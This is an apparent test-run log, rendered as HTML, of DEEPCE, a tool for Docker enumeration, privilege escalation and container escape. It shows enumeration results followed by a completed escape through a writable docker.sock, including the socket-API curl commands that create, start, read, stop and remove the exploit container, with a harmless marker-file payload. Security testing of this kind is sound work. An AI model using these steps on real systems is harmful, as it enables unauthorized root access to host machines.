<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<!-- This file was created with the aha Ansi HTML Adapter. https://github.com/theZiz/aha -->
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="application/xml+xhtml; charset=UTF-8" />
<title>results/docker-alpine-payload-command.log</title>
</head>
<body style="color:white; background-color:black">
<pre>

<span style="font-weight:bold;">                      ##</span><span style="color:white;font-weight:bold;">         .
                ## ## ##        ==
             ## ## ## ##       ===
         /&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;\___/ ===
</span><span style="color:#3333FF;font-weight:bold;">    ~~~ {~~ ~~~~ ~~~ ~~~~ ~~~ ~ /  </span><span style="color:white;font-weight:bold;">===-</span><span style="color:#3333FF;font-weight:bold;"> ~~~</span>
<span style="font-weight:bold;">         \______ X           __/
           \    \         __/
            \____\_______/</span>
          __
     ____/ /__  ___  ____  ________
    / __  / _ \/ _ \/ __ \/ ___/ _ \ <span style="font-weight:bold;">  ENUMERATE</span>
   / /_/ /  __/  __/ /_/ / (__/  __/ <span style="font-weight:bold;"> ESCALATE</span>
   \__,_/\___/\___/ .___/\___/\___/<span style="font-weight:bold;">  ESCAPE</span>
                 /_/

 Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)
 by stealthcopter

<span style="color:#3333FF;font-weight:bold;">==========================================</span><span style="color:lime;font-weight:bold;">( Colors )</span><span style="color:#3333FF;font-weight:bold;">==========================================</span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Exploit Test ............ </span><span style="background-color:black;font-weight:bold;text-decoration:blink;">Exploitable - Check this out</span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Basic Test .............. </span><span style="color:yellow;font-weight:bold;">Positive Result</span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Another Test ............ </span><span style="color:red;font-weight:bold;">Error running check</span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Negative Test ........... </span><span style="font-weight:bold;">No</span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Multi line test ......... </span><span style="color:yellow;font-weight:bold;">Yes</span>
<span style="font-weight:bold;">Command output
spanning multiple lines</span>

<span style="font-weight:bold;">Tips will look like this and often contains links with additional info. You can usually 
ctrl+click links in modern terminal to open in a browser window
See </span><span style="text-decoration:underline;font-weight:bold;">https://stealthcopter.github.io/deepce</span>

<span style="color:#3333FF;font-weight:bold;">===================================</span><span style="color:lime;font-weight:bold;">( Installing Packages )</span><span style="color:#3333FF;font-weight:bold;">====================================</span>
fetch http://dl-cdn.alpinelinux.org/alpine/v3.12/main/x86_64/APKINDEX.tar.gz
fetch http://dl-cdn.alpinelinux.org/alpine/v3.12/community/x86_64/APKINDEX.tar.gz
(1/26) Installing fstrm (0.6.0-r1)
(2/26) Installing libgcc (9.3.0-r2)
(3/26) Installing krb5-conf (1.0-r2)
(4/26) Installing libcom_err (1.45.6-r0)
(5/26) Installing keyutils-libs (1.6.1-r1)
(6/26) Installing libverto (0.3.1-r1)
(7/26) Installing krb5-libs (1.18.2-r0)
(8/26) Installing json-c (0.14-r1)
(9/26) Installing libstdc++ (9.3.0-r2)
(10/26) Installing libprotobuf (3.12.2-r0)
(11/26) Installing libprotoc (3.12.2-r0)
(12/26) Installing protobuf-c (1.3.3-r1)
(13/26) Installing libuv (1.38.1-r0)
(14/26) Installing xz-libs (5.2.5-r0)
(15/26) Installing libxml2 (2.9.10-r5)
(16/26) Installing bind-libs (9.16.6-r0)
(17/26) Installing bind-tools (9.16.6-r0)
(18/26) Installing ca-certificates (20191127-r4)
(19/26) Installing nghttp2-libs (1.41.0-r0)
(20/26) Installing libcurl (7.69.1-r1)
(21/26) Installing curl (7.69.1-r1)
(22/26) Installing lua5.3-libs (5.3.5-r6)
(23/26) Installing libpcap (1.9.1-r2)
(24/26) Installing pcre (8.44-r0)
(25/26) Installing libssh2 (1.9.0-r1)
(26/26) Installing nmap (7.80-r2)
Executing busybox-1.31.1-r16.trigger
Executing ca-certificates-20191127-r4.trigger
OK: 33 MiB in 40 packages
<span style="color:#3333FF;font-weight:bold;">===================================</span><span style="color:lime;font-weight:bold;">( Enumerating Platform )</span><span style="color:#3333FF;font-weight:bold;">===================================</span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Inside Container ........ </span><span style="color:yellow;font-weight:bold;">Yes</span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Container Platform ...... </span><span style="color:yellow;font-weight:bold;">docker</span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Container tools ......... </span><span style="color:red;font-weight:bold;">None</span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> User .................... </span><span style="color:yellow;font-weight:bold;">root</span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Groups .................. </span><span style="font-weight:bold;"></span><span style="color:white;font-weight:bold;"></span><span style="color:white;background-color:black;font-weight:bold;text-decoration:blink;">root</span><span style="font-weight:bold;"> bin daemon sys adm disk </span><span style="color:white;font-weight:bold;"></span><span style="color:white;background-color:black;font-weight:bold;text-decoration:blink;">wheel</span><span style="font-weight:bold;"> floppy dialout tape video</span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Docker Executable ....... </span><span style="font-weight:bold;">Not Found</span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Docker Sock ............. </span><span style="color:yellow;font-weight:bold;">Yes</span>
<span style="color:white;font-weight:bold;">srw-rw----    1 root     116            0 Oct 17 08:19 /var/run/docker.sock</span>

<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Sock is writable ........ </span><span style="background-color:black;font-weight:bold;text-decoration:blink;">Yes</span>
<span style="font-weight:bold;">The docker sock is writable, we should be able to enumerate docker, create containers 
and obtain root privs on the host machine
See </span><span style="text-decoration:underline;font-weight:bold;">https://stealthcopter.github.io/deepce/guides/docker-sock.md</span>

<span style="font-weight:bold;">To see full info from the docker sock output run the following</span>

<span style="font-weight:bold;">curl -s --unix-socket /var/run/docker.sock http://localhost/info</span>

<span style="color:white;font-weight:bold;">KernelVersion:5.4.0-1026-azure
OperatingSystem:Ubuntu 18.04.5 LTS
OSType:linux
Architecture:x86_64
NCPU:2
DockerRootDir:/var/lib/docker
Name:fv-az58
ServerVersion:19.03.13+azure</span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Docker Exploits ......... </span><span style="color:yellow;font-weight:bold;">19.03.13+azure</span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> CVE–2019–13139 .......... </span><span style="font-weight:bold;">No</span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> CVE–2019–5736 ........... </span><span style="font-weight:bold;">No</span>
<span style="color:#3333FF;font-weight:bold;">==================================</span><span style="color:lime;font-weight:bold;">( Enumerating Container )</span><span style="color:#3333FF;font-weight:bold;">===================================</span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Container ID ............ </span><span style="color:yellow;font-weight:bold;">912cb566c610</span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Container Full ID ....... </span><span style="color:yellow;font-weight:bold;">912cb566c6100f4a58ccf85298a0ab8f80fa72096e32f27ebb4804714ea6bad7</span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Container Name .......... </span><span style="color:red;font-weight:bold;">Could not get container name through reverse DNS</span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Container IP ............ </span><span style="color:yellow;font-weight:bold;">172.17.0.2</span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> DNS Server(s) ........... </span><span style="color:yellow;font-weight:bold;">168.63.129.16 </span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Host IP ................. </span><span style="color:yellow;font-weight:bold;">172.17.0.1</span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Operating System ........ </span><span style="font-weight:bold;">Linux</span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Kernel .................. </span><span style="font-weight:bold;">5.4.0-1026-azure</span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Arch .................... </span><span style="font-weight:bold;">x86_64</span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> CPU ..................... </span><span style="font-weight:bold;">Intel(R) Xeon(R) CPU E5-2673 v4 @ 2.30GHz</span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Useful tools installed .. </span><span style="color:yellow;font-weight:bold;">Yes</span>
<span style="font-weight:bold;">/usr/bin/curl
/usr/bin/wget
/usr/bin/nc
/usr/bin/nslookup
/usr/bin/host
/bin/hostname
/usr/bin/dig
/usr/bin/nmap</span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> SSHD Service ............ </span><span style="font-weight:bold;">No</span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Privileged Mode ......... </span><span style="font-weight:bold;">No</span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Alpine Linux Version .... </span><span style="color:yellow;font-weight:bold;">3.12.0</span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> └── CVE-2019-5021 ....... </span><span style="font-weight:bold;">No</span>
<span style="color:#3333FF;font-weight:bold;">====================================</span><span style="color:lime;font-weight:bold;">( Enumerating Mounts )</span><span style="color:#3333FF;font-weight:bold;">====================================</span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Docker sock mounted ....... </span><span style="background-color:black;font-weight:bold;text-decoration:blink;">Yes</span>
<span style="font-weight:bold;">The docker sock is writable, we should be able to enumerate docker, create containers 
and obtain root privs on the host machine
See </span><span style="text-decoration:underline;font-weight:bold;">https://stealthcopter.github.io/deepce/guides/docker-sock.md</span>

<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Other mounts .............. </span><span style="color:yellow;font-weight:bold;">Yes</span>
<span style="font-weight:bold;">/home/runner/work/deepce/deepce/deepce.sh /root/deepce.sh rw,relatime - ext4 /dev/sdb1 rw,discard</span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Possible host usernames ... </span><span style="color:yellow;font-weight:bold;">runner </span>
<span style="color:#3333FF;font-weight:bold;">====================================</span><span style="color:lime;font-weight:bold;">( Interesting Files )</span><span style="color:#3333FF;font-weight:bold;">=====================================</span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Interesting environment variables ... </span><span style="font-weight:bold;">No</span>
<span style="font-weight:bold;">HOME=/root
HOSTNAME=912cb566c610
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PWD=/
SHLVL=1</span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Any common entrypoint files ......... </span><span style="font-weight:bold;">No</span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Interesting files in root ........... </span><span style="font-weight:bold;">No</span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Passwords in common files ........... </span><span style="font-weight:bold;">No</span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Home directories .................... </span><span style="font-weight:bold;">No</span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Hashes in shadow file ............... </span><span style="font-weight:bold;">No permission</span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Searching for app dirs .............. </span>
<span style="color:#3333FF;font-weight:bold;">==================================</span><span style="color:lime;font-weight:bold;">( Enumerating Containers )</span><span style="color:#3333FF;font-weight:bold;">==================================</span>
<span style="font-weight:bold;">By default containers can communicate with other containers on the same network and the 
host machine, this can be used to enumerate further</span>

<span style="color:red;font-weight:bold;"></span>TODO Enumerate container using sock
<span style="color:#3333FF;font-weight:bold;">=====================================</span><span style="color:lime;font-weight:bold;">( Exploiting Sock )</span><span style="color:#3333FF;font-weight:bold;">======================================</span>

<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Preparing Exploit </span><span style="font-weight:bold;"> </span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Exploit Type ............. </span><span style="font-weight:bold;">Custom Command</span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Custom Command ........... </span><span style="font-weight:bold;">touch /tmp/deepce-docker-alpine-payload-command.hacked</span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Clean up ................. </span><span style="font-weight:bold;">Automatic on container exit</span>

<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Creating container ..... </span><span style="color:yellow;font-weight:bold;">b5ccb750cd04a53f8a7deb970bc41f39ac55e9c06af3a129ab67201ddd24fcff</span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> If the shell dies you can restart your listener and run the start command to fire it again </span>
<span style="font-weight:bold;">Start Command: curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/b5ccb750cd04a53f8a7deb970bc41f39ac55e9c06af3a129ab67201ddd24fcff/start</span>
<span style="font-weight:bold;">Logs Command: curl -s --unix-socket /var/run/docker.sock &quot;http://localhost/containers/b5ccb750cd04a53f8a7deb970bc41f39ac55e9c06af3a129ab67201ddd24fcff/logs?stderr=1&amp;stdout=1&quot; --output -</span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Once complete remember to tidy up by stopping and removing your container with following commands </span>
<span style="font-weight:bold;">Stop Command: curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/b5ccb750cd04a53f8a7deb970bc41f39ac55e9c06af3a129ab67201ddd24fcff/stop</span>
<span style="font-weight:bold;">Remove Command: curl -s -XDELETE --unix-socket /var/run/docker.sock http://localhost/containers/b5ccb750cd04a53f8a7deb970bc41f39ac55e9c06af3a129ab67201ddd24fcff</span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Starting container ..... </span><span style="color:yellow;font-weight:bold;">Success</span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Sleeping for ........... </span><span style="font-weight:bold;">2s</span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Fetching logs .......... </span><span style="color:yellow;font-weight:bold;">Success</span>
<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Exploit completed ..... </span><span style="color:yellow;font-weight:bold;">:)</span>
<span style="color:#3333FF;font-weight:bold;">===============================================</span><span style="color:lime;font-weight:bold;"></span><span style="color:#3333FF;font-weight:bold;">===============================================</span>
</pre>
</body>
</html>
